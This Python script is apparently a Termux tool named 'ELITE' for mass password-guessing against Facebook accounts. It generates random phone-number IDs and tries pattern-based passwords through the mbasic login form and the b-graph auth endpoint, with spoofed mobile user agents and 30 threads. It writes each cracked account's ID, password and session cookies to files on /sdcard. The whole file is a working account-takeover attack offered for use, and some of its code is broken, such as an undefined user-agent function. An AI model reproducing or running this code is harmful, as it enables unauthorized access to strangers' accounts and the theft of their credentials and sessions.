import os,sys,uuid,random,time,json,re,requests
from concurrent.futures import ThreadPoolExecutor as ElitePool
from bs4 import BeautifulSoup
from io import BytesIO
from time import sleep as sp
from random import choice as rcc
from random import randint as rrd
try:
    import requests,certifi,rich,pycurl 
except:
    os.system("pip install requests certifi rich pycurl")
    import requests,certifi,rich,pycurl

#≈≈≠≠≠≠≠≠≠ date~code
from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])
#≈≈≠≠≠≠≠≠≠ Colour
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';Q = '\x1b[1;97m'
#---------Style
style = (f"{A}<{G5}/{A}>{G}")
def clear():
    os.system('clear')

clear()



def rnua():
    android_versions = ['7.0', '8.0', '8.1.0', '9', '10', '11', '12', '13', '14']
    chrome_versions = [
        '80.0.3987.99', '83.0.4103.106', '86.0.4240.198', '90.0.4430.91',
        '95.0.4638.74', '100.0.4896.127', '107.0.0.0', '110.0.5481.77',
        '115.0.5790.171', '120.0.6099.129', '125.0.6422.112'
    ]
    signal_versions = ['5.0.0', '6.0.0', '6.10.0', '6.20.0', '7.0.0', '7.2.0', '7.4.0']

    android_version = random.choice(android_versions)
    chrome_version = random.choice(chrome_versions)
    signal_version = random.choice(signal_versions)
    device = random.choice([
        'Pixel 6', 'Pixel 6a', 'Pixel 7', 'Pixel 7 Pro', 'Pixel 8', 'Pixel 8 Pro',
        'Redmi Note 10 Pro', 'Samsung Galaxy S21', 'OnePlus 9', 'Nothing Phone 1'
    ])

    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Mobile Safari/537.36 "
        f"Signal/{signal_version}"
    )
    return ua


import random





def f4():
    poco_models = ['Poco F1', 'Poco X3 NFC', 'Poco M3', 'Poco F2 Pro', 'Poco X4 Pro', 'Poco M4 Pro']
    user_agent = (
        f"[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/"
        f"{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=1080,height=2400}};FBLC/en_US;FBRV/"
        f"{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"
        f"{random.choice(poco_models)};FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]"
    )
    return user_agent

def best_redmi_ua():
    redmi_best_models = [
        {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "resolution": (1080, 2400)},
        {"model": "Redmi 12", "code": "23053RN02L", "android": "13", "resolution": (1080, 2460)},
        {"model": "Redmi Note 11", "code": "2109119DG", "android": "13", "resolution": (1080, 2400)}
    ]

    selected = random.choice(redmi_best_models)
    density = round(random.uniform(2.5, 3.5), 2)
    width, height = selected["resolution"]

    ua = (
        f"[FBAN/FB4A;"
        f"FBAV/449.0.0.9.105;"
        f"FBBV/298672707;"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/bn_BD;"
        f"FBRV/299927973;"
        f"FBCR/Grameenphone;"
        f"FBMF/Xiaomi;"
        f"FBBD/Redmi;"
        f"FBPN/com.facebook.katana;"
        f"FBDV/{selected['code']};"
        f"FBSV/{selected['android']};"
        f"FBOP/1;"
        f"FBCA/arm64-v8a:;]"
    )

    return ua





def redmiua():
    android_versions = ['7.0', '7.1.1', '8.0.0', '8.1.0', '9', '10', '11', '12', '13']
    redmi_models = [
        'Redmi Note 7', 'Redmi Note 7 Pro', 'Redmi Note 8', 'Redmi Note 8T', 'Redmi Note 8 Pro',
        'Redmi Note 9', 'Redmi Note 9 Pro', 'Redmi Note 9S', 'Redmi Note 10', 'Redmi Note 10S',
        'Redmi Note 10 Pro', 'Redmi Note 11', 'Redmi Note 11 Pro', 'Redmi Note 12', 'Redmi 7A',
        'Redmi 8A', 'Redmi 9A', 'Redmi 10A']
    android_version = random.choice(android_versions)
    redmi_model = random.choice(redmi_models)
    miui_version = f"V{random.randint(10, 13)}.0.{random.randint(1, 20)}.0"
    user_agent = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {redmi_model} MIUI/{miui_version}) "
        f"[FBAN/Orca-Android;FBAV/{random.randint(200, 350)}.0.0.{random.randint(10, 80)}.{random.randint(10, 300)};"
        f"FBPN/com.facebook.orca;FBLC/en_US;FBBV/{random.randint(100000000, 300000000)};"
        f"FBCR/PLAY;FBMF=Xiaomi;FBBD=xiaomi;FBDV={redmi_model};FBSV={android_version};"
        f"FBCA/arm64-v8a:null;FBDM={{density=2.75,width=1080,height=2130}};FB_FW/1;] FBBK/1"
    )
    return user_agent

import random




#==========SIMPLE DEF
def line():
    print(X5+"~"*42)

#==========logo

logo =  f"""
 888888 88     88 888888 888888    {G1}/
 88__   88     88   88   88__    {G5} /
 88""   88  .o 88   88   88""   {G1} / {A}V{R}.{X3}60{R}.{X3}1
 888888 88ood8 88   88   888888 {G5}/ {A}T{R}.{X3}{today}
{X5}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 {A}[{G5}\{A}] {G}Developer{A} : {G}Akash Das
 {A}[{G5}\{A}] {G}Github {A}   :{G} ELITE-CYBER
 {A}[{G5}\{A}] {G}ToolsType {A}: {G}Random"""
loop=0
oks=[]
cps=[]
cpc=[]
user=[]
A=["1","01","a","A"]
B=["2","02","b","B"]



#========== main menu(<<>>)
def main():
    clear()
    print(logo)
    line()
    print(f"{Q} [{G5}A{Q}]{G} RANDOM CLONE")
    print(f"{Q} [{G5}B{Q}]{G} EXIT CLONE")
    line()
    cos=input(f"{Q} [{G5}={Q}]{G} -{Q}> ")
    if cos in A:
        renx()
    elif cos in B:
        exit()
    else:
        main()




#========== random main menu(<<>>)
def renx():
    user=[]
    pase=[]
    clear()
    print(logo);line()
    print(f"{G} Example {Q}:{G5}-{Q}:{G} 0184{Q}/{G}0130{Q}/{G}0199{X1}..{Q}Etc. ")
    line()
    code=input(f" {Q}<{G5}/{Q}>{G2} Choice {Q}>> ");line()
    print(f"{G} Example {Q}:{G5}-{Q}: {G}2000{Q}/{G}5999{Q}/{G}10000 ")
    line()
    limi=int(input(f" {Q}<{G5}/{Q}>{G2} Choice {Q}>> "))
    line()
    for i in range(limi):
        akashxd=str(random.choice(range(1000000,9999999)))
        user.append(akashxd)
    clear()
    print(logo);line()
    print(f"{G} Example {Q}:{G5}-{Q}: [{M}1{Q}-{M}15{Q}] ")
    line()
    limix=int(input(f"{Q} [{G5}={Q}]{G}pass limet -{Q}> "))
    line()
    print(f'')
    clear()
    print(logo);line()
    for ic in range(limix):
        print(f"{G} Example {Q}:{G5}-{Q}: {G}first6{Q}/{G2}last6{Q}/{G5}sadiya");line()
        pas=str(input(f" {Q}<{G5}/{Q}>{G2} Choice {Q}>> "))
        line()
        if pas not in pase:
            pase.append(pas)
    
    print(f"{Q} [{G5}A{Q}]{G} Method {Q}1")
    print(f"{Q} [{G5}B{Q}]{G} Method {Q}2")
    line()
    meth=input(f" {Q}<{G5}/{Q}>{G2} Choice {Q}>> ")
    with ElitePool(max_workers=30) as akash:
        clear()
        print(logo);line()
        tl=str(len(user))
        print(f"{Q} [{G5}={Q}]{G} Total Id {Q} :{G} "+tl)
        print(f"{Q} [{G5}={Q}]{G} Used Pass {Q}:{G} "+str(len(pase)))
        line()
        for xd in user:
            uid=code+xd
            if meth in A:
                akash.submit(elite_m1,uid,pase,tl)
            elif meth in B:
                akash.submit(elite_m2,uid,pase,tl)

    line()
    print(f"{Q} [{G5}>{Q}]{G} Crack Complete")
    print(f"{Q} [{G5}<{Q}]{G} Total OK {Q}:{G} "+str(len(oks)))
    line()




#=========random method 1
def elite_m1(uid,pase,tl):
    global oks,loop,cps
    hu=random.choice(['+','-'])
    sys.stdout.write(f'\r{Q}[{G}ELITE{Q}{Q}~{G5}M1{Q}] {Q}[{M}{loop}{Q}/{X3}{tl}{Q}] {Q}[{G}ok{Q}/{R}cp{Q}] {Q}[{G}{str(len(oks))}{Q}/{R}{str(len(cps))}{Q}] \r');sys.stdout.flush()
    try:
        for pw in pase:
            session=requests.Session()
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            login_page_url = "https://mbasic.facebook.com/login.php"
            response = session.get(login_page_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            lsd = soup.find('input', {'name':'lsd'}).get('value', '') if soup.find('input', {'name':'lsd'}) else ''
            jazoest = soup.find('input', {'name':'jazoest'}).get('value', '') if soup.find('input', {'name':'jazoest'}) else ''
            m_ts = soup.find('input', {'name':'m_ts'}).get('value', '') if soup.find('input', {'name':'m_ts'}) else ''
            li = soup.find('input', {'name':'li'}).get('value', '') if soup.find('input', {'name':'li'}) else ''
            try_number = soup.find('input', {'name':'try_number'}).get('value', '') if soup.find('input', {'name':'try_number'}) else ''
            unrecognized_tries = soup.find('input', {'name':'unrecognized_tries'}).get('value', '') if soup.find('input', {'name':'unrecognized_tries'}) else ''
            data= {
            'lsd': lsd,
            'jazoest': jazoest,
            'm_ts': m_ts,
            'li': li,
            'try_number': uid,
            'unrecognized_tries': unrecognized_tries,
            'email': uid,
            'pass': ps,
            'login': 'Log In',}
            header ={
            'Host': 'mbasic.facebook.com',
            'method': 'POST','scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','dpr': '2.75',
            'referer': 'https://mbasic.facebook.com/','sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"','sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23053RN02I"','sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site','sec-fetch-user': '?1','upgrade-insecure-requests': '1',
            'user-agent': lite_ua(),'viewport-width': '980',}
            session.post("https://mbasic.facebook.com/login",data=data,headers=header,allow_redirects=True)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r{Q} [{G}AKASH-OK{Q}]{G} {xd}{Q} |{Q} {ps}{Q} |{X3} {coki}")
                oks.append(xd)
                with open("/sdcard/ELITE-OK.txt", "a", encoding="utf-8") as f:
                    f.write(f"{xd}|{ps}|{coki}\n")
                break
            elif "checkpoint" in res:
                xx=coki.split("1000")[1]
                xd="1000"+xd[:11]
                print(f"\r\r{R}[CP] {uid} | {ps}")
                with open("/sdcard/ELITE-RAND-CP.txt", "a", encoding="utf-8") as f:
                    f.write(f"{uid}|{ps}\n")
                cps.append(uid)
                break 
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(40)


#========random method << 2 >>

def elite_m2(uid,pase,tl):
    global oks,loop,cps
    hu=random.choice(['+','-'])
    sys.stdout.write(f'\r{Q}[{G}ELITE{Q}~{G5}M2{Q}] {Q}[{M}{loop}{Q}/{X3}{tl}{Q}] {Q}[{G}ok{Q}/{R}cp{Q}] {Q}[{G}{str(len(oks))}{Q}/{R}{str(len(cps))}{Q}] \r');sys.stdout.flush()
    
    try:
        for pw in pase:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-5:])
            ua_string=""
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '','cpl': 'true','try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password','source': 'login',
            'error_detail_type': 'button_with_disabled','enroll_misauth': 'false',
            'generate_session_cookies': '1','generate_machine_id': '1',
            'currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head= {
            'Host': 'b-graph.facebook.com',
            'User-Agent': best_redmi_ua(),
            'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 100000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger',}
            url1= 'https://b-graph.facebook.com/auth/login'
            res=requests.post(url1,data=data,headers=head).json()
            if "session_key" in res:
                coki=";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                xd=res["uid"]
                print(f"\r\r{Q} [{G}AKASH-OK{Q}]{G} {xd}{Q} |{Q} {ps}{Q} |{X1} {coki}")
                oks.append(xd)
                with open("/sdcard/ELITE-OK.txt", "a", encoding="utf-8") as f:
                    f.write(f"{xd}|{ps}|{coki}\n")
                break
            elif "www.facebook.com" in res:
                print(f"\r\r{R}[CP] {uid} | {ps}")
                with open("/sdcard/ELITE-RAND-CP.txt", "a", encoding="utf-8") as f:
                    f.write(f"{uid}|{ps}\n")
                cps.append(uid)
                break 
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(40)


#======END
main()